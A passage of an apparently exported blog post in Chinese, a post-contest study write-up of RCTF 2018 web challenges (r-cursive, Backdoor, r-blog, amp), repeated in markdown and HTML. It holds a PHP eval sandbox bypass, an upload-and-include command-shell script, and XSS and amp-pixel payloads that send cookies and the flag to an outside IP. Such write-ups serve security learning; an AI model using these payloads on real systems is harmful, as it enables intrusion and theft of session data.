2.0//EN\">\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\n<p>You don't have permission to access /\non this server.<br />\n</p>\n<hr>\n<address>Apache/2.4.10 (Debian) Server at .sandbox.r-cursive.ml Port 1337</address>\n</body></html>\n```\n\n报错，403，这是由于sandbox目录下只有init.php，没有index.php的缘故。我们访问init.php试试，200,没有报错。说明open_basedir已经发生变化。\n\n```\nGET /init.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:26:20 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 0\nConnection: close\nContent-Type: text/html; charset=UTF-8      \n```\n\ngetflag:\n\n```\nGET /71aabdeb3d708872c6e00e066ae48b2669834df7/index.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get('open_basedir');var_dump(file_get_contents(\"/var/www/sandbox/init.php\"));\n```\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 22 May 2018 06:51:10 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nVary: Accept-Encoding\nContent-Length: 186\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/:/tmp/string(148) \"<?php\n    ini_set(\"open_basedir\", $_SERVER['DOCUMENT_ROOT'].\"/:/tmp/\");\n    // flag: RCTF{apache_mod_vhost_alias_should_be_configured_correctly}\n?>\n\"\n```\n\n## Backdoor\n\n![1526992722365](/images/rctf/1526992722365.png)\n\n根据contrab.sh,我们可以得到两个链接：\n\n> http://backdoor.2018.teamrois.cn/post.php?action=upload\n>\n> http://backdoor.2018.teamrois.cn/post.php?action=debugging&count=$debuggers\n\n打开首页，查看源码，得到aaencode之后的js代码:\n\n解密网址:`https://tool.zcmzcm.org/aadecode`\n\n```\ndocument.loginform.onsubmit = function (e) { \n\te.preventDefault()\n\tdocument.getElementById('wp-submit').disabled = 'disabled'\n\tsetTimeout(function () {\n\t\tdocument.getElementById('wp-submit').removeAttribute('disabled')\n\t\talert('Login failed')\n\t\t\"What? Need hint?\"\n\t\t\"index.php is a hint!\"\n\t}, 3000)\n}\n```\n\n说明，不用登录。\n\n查看post.php，发现可能存在LFI。\n\nindex.php,没啥用\n\n> http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index\n\npost.php\n\n```\n<?php\nerror_reporting(0);\ninclude $_GET['action'] . '.php';\n```\n\nuploa.php\n\n```\n<?php\nif (!isset($_FILES['file'])) exit;\n$file = $_FILES['file'];\n$zip = new ZipArchive();\nif (true !== $zip->open($file['tmp_name'])) {\n\techo 'No a valid zip';\n\texit;\n}\nif (false === $zip->getFromName('tmp/random.txt')) {\n\techo 'No file';\n\texit;\n}\n\n$dest = 'uploads/' . md5($_SERVER['REMOTE_ADDR']) . hash('sha256', file_get_contents($file['tmp_name'])) . '.zip';\nmove_uploaded_file($file['tmp_name'], $dest);\necho 'Saved into ' . $dest;\n```\n\n利用zip://或者phar://包含。\n\n```python\nimport requests\n\ns = \"Saved into \"\npost_url = \"http://backdoor.2018.teamrois.cn/post.php?action=upload\"\nzip_file = open(\"tmp.zip\",\"rb\")\nupload_file = {'file':zip_file}\nr = requests.post(post_url,files=upload_file)\ndest = r.text[len(s):]\nshell_url = \"http://backdoor.2018.teamrois.cn/post.php?action=phar://\"+ dest + \"/evil\"\nprint(\"[*] shell url: \" + shell_url)\nwhile  True:\n    command = input(\"command: \")\n    payload = {'chybeta': 'system(\"%s\");' % command}\n    r = requests.get(shell_url,params=payload)\n    print(r.text)\n```\n\n## r-blog\n\ntitle:        \"<>1\"\n\ncontent: \"<>1\"\n\n结果：\n\n```\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n\t<meta charset=\"utf-8\">\n\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n\t<link rel=\"stylesheet\" href=\"/assets/css/bootstrap.min.css\">\n\t<link rel=\"stylesheet\" href=\"/assets/css/style.css\">\n\t<link href=\"https://fonts.googleapis.com/css?family=Titillium+Web\" rel=\"stylesheet\">\n\t<title>rBlog 2018</title>\n</head>\n<body>\n<div class=\"container mt-5\">\n\t<div class=\"card\">\n\t\t\t\t<div class=\"card-body\">\n\t\t\t<h2 class=\"card-title\"><>1</h2>\n\t\t\t<p class=\"card-text\">&lt;&gt;2</p>\n\t\t</div>\n\t</div>\n</div>\n<script nonce=\"090c154a21d0fdf5809aff4586fe1eed\" src=\"/assets/js/jquery.min.js\"></script>\n</body>\n</html>\n```\n\ntitle没有过滤，content过滤。\n\ncsp如下:\n\n```\nX-Frame-Options: DENY\nContent-Security-Policy: default-src 'none'; script-src 'nonce-3ae08923a2654e27a3734f7876a5abe0'; frame-src https://www.google.com/recaptcha/; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self'\n```\n\n我们看到jquery.min.js是相对地址，并且base-uri没有在csp中指定。\n\n所以payload如下:\n\ntitle: `<base href =\"http://【my_server】/\">`\n\ncontent: 随意\n\n在字节的vps上添加jquery.min.js，网址:           `http://[my_server]/assets/js/jquery.min.js`\n\njquery.min.js的内容：\n\n```\nwindow.location.href=\"http://123.207.90.143?\"+document.cookie;\n```\n\n最终结果:\n\n```\n115.159.200.107 - - [22/May/2018:21:39:02 +0800] \"GET /?flag=RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012};%20hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d HTTP/1.1\" 200 15 \"http://rblog.2018.teamrois.cn/\" \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/66.0.3359.181 Safari/537.36\"\n\n```\n\n## amp\n\npayload:\n\n> http://amp.2018.teamrois.cn?name=<amp-pixel src=\"https://123.207.90.143:1234/pixel?clientId=CLIENT_ID(FLAG)\"></amp-pixel>\n\n```\n[root@VM_89_224_redhat ~]# nc -lvv 1234\nNcat: Version 6.40 ( http://nmap.org/ncat )\nNcat: Listening on :::1234\nNcat: Listening on 0.0.0.0:1234\nNcat: Connection from 106.120.206.166.\nNcat: Connection from 106.120.206.166:64053.\n\u0016\u0003\u0001\u0002\u0001\u0001�\u0003\u0003�Y���8۲Y�=����6���km����\n                                 ��A It+z���^�vY�$���,�\u00183�'�����*K�Zp\"jj\u0013\u0001\u0013\u0002\u0013\u0003�+�/�,�0̨̩�\u0013�\u0014��/5\n\u0014\u0012\u0004\u0004\u0004\u0001\u0006\u0006\u0001\u0002\u0001\u0001\u0012\u0010\n              \u0002hhttp/1.1uP\n                          \u0002\u00013+)jj\u0001\u001d �ZaV>WB�~\u0013���|�Z��4KM�������Et~-\u0002\u0001\u0001+\n\n��\u0017\u0003\u0003\u0003\u0002\u0003\u0001\n\n```\n\nwriteup:\n\n>  https://github.com/zsxsoft/my-rctf-2018/tree/master/amp\n\n注意，我这里是乱码的原因是，我直接监听1234端口，并不支持ssl。\n\n\n\n","slug":"rctf2018学习笔记","published":1,"updated":"2018-06-01T06:10:47.869Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jps000wly4jnnnh5gdc","content":"<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><a id=\"more\"></a>\n<p>赛后总结，没做过题目</p>\n<h2 id=\"r-cursive\"><a href=\"#r-cursive\" class=\"headerlink\" title=\"r-cursive\"></a>r-cursive</h2><p>源代码:</p>\n<pre><code>&lt;?php\n$token = sha1($_SERVER[&#39;REMOTE_ADDR&#39;]);\n$dir = &#39;../sandbox/&#39;.$token.&#39;/&#39;;\nis_dir($dir) ?: mkdir($dir);\nis_file($dir.&#39;index.php&#39;) ?: file_put_contents($dir.&#39;index.php&#39;, str_replace(&#39;#SHA1#&#39;, $token, file_get_contents(&#39;./template&#39;)));\nswitch($_GET[&#39;action&#39;] ?: &#39;&#39;){\n    case &#39;go&#39;:\n        header(&#39;Location: http://&#39;.$token.&#39;.sandbox.r-cursive.ml:1337/&#39;);\n        break;\n    case &#39;reset&#39;:\n        system(&#39;rm -rf &#39;.$dir);\n        break;\n    default:\n        show_source(__FILE__);\n}\n?&gt;\n&lt;style&gt;code{font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;}&lt;/style&gt;\n</code></pre><p>template:</p>\n<pre><code>&lt;?php\nsha1($_SERVER[&#39;REMOTE_ADDR&#39;]) === &#39;#SHA1#&#39; ?: die();\n&#39;;&#39; === preg_replace(&#39;/[^\\W_]+\\((?R)?\\)/&#39;, NULL, $_GET[&#39;cmd&#39;]) ? eval($_GET[&#39;cmd&#39;]) : show_source(__FILE__);\n</code></pre><p><a href=\"http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/\" target=\"_blank\" rel=\"noopener\">http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/</a>:</p>\n<pre><code>&lt;?php\nsha1($_SERVER[&#39;REMOTE_ADDR&#39;]) === &#39;589bf872527b686d94b4448c8ea3aed4761eaddc&#39; ?: die();\n&#39;;&#39; === preg_replace(&#39;/[^\\W_]+\\((?R)?\\)/&#39;, NULL, $_GET[&#39;cmd&#39;]) ? eval($_GET[&#39;cmd&#39;]) : show_source(__FILE__);\n</code></pre><pre><code>?cmd=print(readdir(opendir(getcwd()))); 可以列目录\n?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件\n?cmd=print(dirname(dirname(getcwd()))); print出/var/www\n</code></pre><p>翻阅文档找到<code>getallheaders()</code>函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了<br>?cmd=print(end(getallheaders()));</p>\n<pre><code>GET /?cmd=eval(implode(getallheaders())); HTTP/1.1\nHost: 589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml\ncmd: phpinfo(); //\n</code></pre><p><img src=\"/images/rctf/1526973311681.png\" alt=\"1526973311681\"></p>\n<p>这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir。</p>\n<pre><code>You can use auto_prepend option in php.ini to supply script that will be executed first. There you can setup open_basedir via ini_set() function based on contents of $_SERVER array.\nanswered May 10 &#39;13 at 17:21\ngmsalex\n20816\nYeah, something like this could do it: ini_set(&#39;open_basedir&#39;,&quot;/var/www/hosts/$hostname/:/tmp/&quot;); – Sunry Feb 9 at 1:29\n</code></pre><p>不修改host:</p>\n<pre><code>GET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: 71aabdeb3d708872c6e00e066ae48b2669834df7.sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get(&#39;open_basedir&#39;);\n</code></pre><pre><code>HTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:25:09 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 64\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/71aabdeb3d708872c6e00e066ae48b2669834df7/:/tmp/\n</code></pre><p>修改host:</p>\n<pre><code>GET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get(&#39;open_basedir&#39;);\n</code></pre><pre><code>HTTP/1.1 403 Forbidden\nDate: Tue, 22 May 2018 07:25:36 GMT\nServer: Apache/2.4.10 (Debian)\nContent-Length: 298\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;403 Forbidden&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;Forbidden&lt;/h1&gt;\n&lt;p&gt;You don&#39;t have permission to access /\non this server.&lt;br /&gt;\n&lt;/p&gt;\n&lt;hr&gt;\n&lt;address&gt;Apache/2.4.10 (Debian) Server at .sandbox.r-cursive.ml Port 1337&lt;/address&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre><p>报错，403，这是由于sandbox目录下只有init.php，没有index.php的缘故。我们访问init.php试试，200,没有报错。说明open_basedir已经发生变化。</p>\n<pre><code>GET /init.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get(&#39;open_basedir&#39;);\n</code></pre><pre><code>HTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:26:20 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 0\nConnection: close\nContent-Type: text/html; charset=UTF-8\n</code></pre><p>getflag:</p>\n<pre><code>GET /71aabdeb3d708872c6e00e066ae48b2669834df7/index.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get(&#39;open_basedir&#39;);var_dump(file_get_contents(&quot;/var/www/sandbox/init.php&quot;));\n</code></pre><pre><code>HTTP/1.1 200 OK\nDate: Tue, 22 May 2018 06:51:10 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nVary: Accept-Encoding\nContent-Length: 186\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/:/tmp/string(148) &quot;&lt;?php\n    ini_set(&quot;open_basedir&quot;, $_SERVER[&#39;DOCUMENT_ROOT&#39;].&quot;/:/tmp/&quot;);\n    // flag: RCTF{apache_mod_vhost_alias_should_be_configured_correctly}\n?&gt;\n&quot;\n</code></pre><h2 id=\"Backdoor\"><a href=\"#Backdoor\" class=\"headerlink\" title=\"Backdoor\"></a>Backdoor</h2><p><img src=\"/images/rctf/1526992722365.png\" alt=\"1526992722365\"></p>\n<p>根据contrab.sh,我们可以得到两个链接：</p>\n<blockquote>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=upload\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=upload</a></p>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers</a></p>\n</blockquote>\n<p>打开首页，查看源码，得到aaencode之后的js代码:</p>\n<p>解密网址:<code>https://tool.zcmzcm.org/aadecode</code></p>\n<pre><code>document.loginform.onsubmit = function (e) { \n    e.preventDefault()\n    document.getElementById(&#39;wp-submit&#39;).disabled = &#39;disabled&#39;\n    setTimeout(function () {\n        document.getElementById(&#39;wp-submit&#39;).removeAttribute(&#39;disabled&#39;)\n        alert(&#39;Login failed&#39;)\n        &quot;What? Need hint?&quot;\n        &quot;index.php is a hint!&quot;\n    }, 3000)\n}\n</code></pre><p>说明，不用登录。</p>\n<p>查看post.php，发现可能存在LFI。</p>\n<p>index.php,没啥用</p>\n<blockquote>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index</a></p>\n</blockquote>\n<p>post.php</p>\n<pre><code>&lt;?php\nerror_reporting(0);\ninclude $_GET[&#39;action&#39;] . &#39;.php&#39;;\n</code></pre><p>uploa.php</p>\n<pre><code>&lt;?php\nif (!isset($_FILES[&#39;file&#39;])) exit;\n$file = $_FILES[&#39;file&#39;];\n$zip = new ZipArchive();\nif (true !== $zip-&gt;open($file[&#39;tmp_name&#39;])) {\n    echo &#39;No a valid zip&#39;;\n    exit;\n}\nif (false === $zip-&gt;getFromName(&#39;tmp/random.txt&#39;)) {\n    echo &#39;No file&#39;;\n    exit;\n}\n\n$dest = &#39;uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . hash(&#39;sha256&#39;, file_get_contents($file[&#39;tmp_name&#39;])) . &#39;.zip&#39;;\nmove_uploaded_file($file[&#39;tmp_name&#39;], $dest);\necho &#39;Saved into &#39; . $dest;\n</code></pre><p>利用zip://或者phar://包含。</p>\n<pre><code class=\"python\">import requests\n\ns = &quot;Saved into &quot;\npost_url = &quot;http://backdoor.2018.teamrois.cn/post.php?action=upload&quot;\nzip_file = open(&quot;tmp.zip&quot;,&quot;rb&quot;)\nupload_file = {&#39;file&#39;:zip_file}\nr = requests.post(post_url,files=upload_file)\ndest = r.text[len(s):]\nshell_url = &quot;http://backdoor.2018.teamrois.cn/post.php?action=phar://&quot;+ dest + &quot;/evil&quot;\nprint(&quot;[*] shell url: &quot; + shell_url)\nwhile  True:\n    command = input(&quot;command: &quot;)\n    payload = {&#39;chybeta&#39;: &#39;system(&quot;%s&quot;);&#39; % command}\n    r = requests.get(shell_url,params=payload)\n    print(r.text)\n</code></pre>\n<h2 id=\"r-blog\"><a href=\"#r-blog\" class=\"headerlink\" title=\"r-blog\"></a>r-blog</h2><p>title:        “&lt;&gt;1”</p>\n<p>content: “&lt;&gt;1”</p>\n<p>结果：</p>\n<pre><code>\n&lt;!doctype html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset=&quot;utf-8&quot;&gt;\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/bootstrap.min.css&quot;&gt;\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/style.css&quot;&gt;\n    &lt;link href=&quot;https://fonts.googleapis.com/css?family=Titillium+Web&quot; rel=&quot;stylesheet&quot;&gt;\n    &lt;title&gt;rBlog 2018&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div class=&quot;container mt-5&quot;&gt;\n    &lt;div class=&quot;card&quot;&gt;\n                &lt;div class=&quot;card-body&quot;&gt;\n            &lt;h2 class=&quot;card-title&quot;&gt;&lt;&gt;1&lt;/h2&gt;\n            &lt;p class=&quot;card-text&quot;&gt;&amp;lt;&amp;gt;2&lt;/p&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n&lt;script nonce=&quot;090c154a21d0fdf5809aff4586fe1eed&quot; src=&quot;/assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>title没有过滤，content过滤。</p>\n<p>csp如下:</p>\n<pre><code>X-Frame-Options: DENY\nContent-Security-Policy: default-src &#39;none&#39;; script-src &#39;nonce-3ae08923a2654e27a3734f7876a5abe0&#39;; frame-src https://www.google.com/recaptcha/; style-src &#39;self&#39; &#39;unsafe-inline&#39; fonts.googleapis.com; font-src fonts.gstatic.com; img-src &#39;self&#39;\n</code></pre><p>我们看到jquery.min.js是相对地址，并且base-uri没有在csp中指定。</p>\n<p>所以payload如下:</p>\n<p>title: <code>&lt;base href =&quot;http://【my_server】/&quot;&gt;</code></p>\n<p>content: 随意</p>\n<p>在字节的vps上添加jquery.min.js，网址:           <code>http://[my_server]/assets/js/jquery.min.js</code></p>\n<p>jquery.min.js的内容：</p>\n<pre><code>window.location.href=&quot;http://123.207.90.143?&quot;+document.cookie;\n</code></pre><p>最终结果:</p>\n<pre><code>115.159.200.107 - - [22/May/2018:21:39:02 +0800] &quot;GET /?flag=RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012};%20hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d HTTP/1.1&quot; 200 15 &quot;http://rblog.2018.teamrois.cn/&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/66.0.3359.181 Safari/537.36&quot;\n</code></pre><h2 id=\"amp\"><a href=\"#amp\" class=\"headerlink\" title=\"amp\"></a>amp</h2><p>payload:</p>\n<blockquote>\n<p><a href=\"http://amp.2018.teamrois.cn?name=\" target=\"_blank\" rel=\"noopener\">http://amp.2018.teamrois.cn?name=</a><amp-pixel src=\"https://123.207.90.143:1234/pixel?clientId=CLIENT_ID(FLAG)\"></amp-pixel></p>\n</blockquote>\n<pre><code>[root@VM_89_224_redhat ~]# nc -lvv 1234\nNcat: Version 6.40 ( http://nmap.org/ncat )\nNcat: Listening on :::1234\nNcat: Listening on 0.0.0.0:1234\nNcat: Connection from 106.120.206.166.\nNcat: Connection from 106.120.206.166:64053.\n\u0016\u0003\u0001\u0002\u0001\u0001�\u0003\u0003�Y���8۲Y�=����6���km����\n                                 ��A It+z���^�vY�$���,�\u00183�&#39;�����*K�Zp&quot;jj\u0013\u0001\u0013\u0002\u0013\u0003�+�/�,�0̨̩�\u0013�\u0014��/5\n\u0014\u0012\u0004\u0004\u0004\u0001\u0006\u0006\u0001\u0002\u0001\u0001\u0012\u0010\n              \u0002hhttp/1.1uP\n                          \u0002\u00013+)jj\u0001\u001d �ZaV&gt;WB�~\u0013���|�Z��4KM�������Et~-\u0002\u0001\u0001+\n\n��\u0017\u0003\u0003\u0003\u0002\u0003\u0001\n</code></pre><p>writeup:</p>\n<blockquote>\n<p> <a href=\"https://github.com/zsxsoft/my-rctf-2018/tree/master/amp\" target=\"_blank\" rel=\"noopener\">https://github.com/zsxsoft/my-rctf-2018/tree/master/amp</a></p>\n</blockquote>\n<p>注意，我这里是乱码的原因是，我直接监听1234端口，并不支持ssl。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1>","more":"<p>赛后总结，没做过题目</p>\n<h2 id=\"r-cursive\"><a href=\"#r-cursive\" class=\"headerlink\" title=\"r-cursive\"></a>r-cursive</h2><p>源代码:</p>\n<pre><code>&lt;?php\n$token = sha1($_SERVER[&#39;REMOTE_ADDR&#39;]);\n$dir = &#39;../sandbox/&#39;.$token.&#39;/&#39;;\nis_dir($dir) ?: mkdir($dir);\nis_file($dir.&#39;index.php&#39;) ?: file_put_contents($dir.&#39;index.php&#39;, str_replace(&#39;#SHA1#&#39;, $token, file_get_contents(&#39;./template&#39;)));\nswitch($_GET[&#39;action&#39;] ?: &#39;&#39;){\n    case &#39;go&#39;:\n        header(&#39;Location: http://&#39;.$token.&#39;.sandbox.r-cursive.ml:1337/&#39;);\n        break;\n    case &#39;reset&#39;:\n        system(&#39;rm -rf &#39;.$dir);\n        break;\n    default:\n        show_source(__FILE__);\n}\n?&gt;\n&lt;style&gt;code{font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;}&lt;/style&gt;\n</code></pre><p>template:</p>\n<pre><code>&lt;?php\nsha1($_SERVER[&#39;REMOTE_ADDR&#39;]) === &#39;#SHA1#&#39; ?: die();\n&#39;;&#39; === preg_replace(&#39;/[^\\W_]+\\((?R)?\\)/&#39;, NULL, $_GET[&#39;cmd&#39;]) ? eval($_GET[&#39;cmd&#39;]) : show_source(__FILE__);\n</code></pre><p><a href=\"http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/\" target=\"_blank\" rel=\"noopener\">http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/</a>:</p>\n<pre><code>&lt;?php\nsha1($_SERVER[&#39;REMOTE_ADDR&#39;]) === &#39;589bf872527b686d94b4448c8ea3aed4761eaddc&#39; ?: die();\n&#39;;&#39; === preg_replace(&#39;/[^\\W_]+\\((?R)?\\)/&#39;, NULL, $_GET[&#39;cmd&#39;]) ? eval($_GET[&#39;cmd&#39;]) : show_source(__FILE__);\n</code></pre><pre><code>?cmd=print(readdir(opendir(getcwd()))); 可以列目录\n?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件\n?cmd=print(dirname(dirname(getcwd()))); print出/var/www\n</code></pre><p>翻阅文档找到<code>getallheaders()</code>函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了<br>?cmd=print(end(getallheaders()));</p>\n<pre><code>GET /?cmd=eval(implode(getallheaders())); HTTP/1.1\nHost: 589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml\ncmd: phpinfo(); //\n</code></pre><p><img src=\"/images/rctf/1526973311681.png\" alt=\"1526973311681\"></p>\n<p>这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir。</p>\n<pre><code>You can use auto_prepend option in php.ini to supply script that will be executed first. There you can setup open_basedir via ini_set() function based on contents of $_SERVER array.\nanswered May 10 &#39;13 at 17:21\ngmsalex\n20816\nYeah, something like this could do it: ini_set(&#39;open_basedir&#39;,&quot;/var/www/hosts/$hostname/:/tmp/&quot;); – Sunry Feb 9 at 1:29\n</code></pre><p>不修改host:</p>\n<pre><code>GET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: 71aabdeb3d708872c6e00e066ae48b2669834df7.sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get(&#39;open_basedir&#39;);\n</code></pre><pre><code>HTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:25:09 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 64\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/71aabdeb3d708872c6e00e066ae48b2669834df7/:/tmp/\n</code></pre><p>修改host:</p>\n<pre><code>GET /?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get(&#39;open_basedir&#39;);\n</code></pre><pre><code>HTTP/1.1 403 Forbidden\nDate: Tue, 22 May 2018 07:25:36 GMT\nServer: Apache/2.4.10 (Debian)\nContent-Length: 298\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;403 Forbidden&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;Forbidden&lt;/h1&gt;\n&lt;p&gt;You don&#39;t have permission to access /\non this server.&lt;br /&gt;\n&lt;/p&gt;\n&lt;hr&gt;\n&lt;address&gt;Apache/2.4.10 (Debian) Server at .sandbox.r-cursive.ml Port 1337&lt;/address&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre><p>报错，403，这是由于sandbox目录下只有init.php，没有index.php的缘故。我们访问init.php试试，200,没有报错。说明open_basedir已经发生变化。</p>\n<pre><code>GET 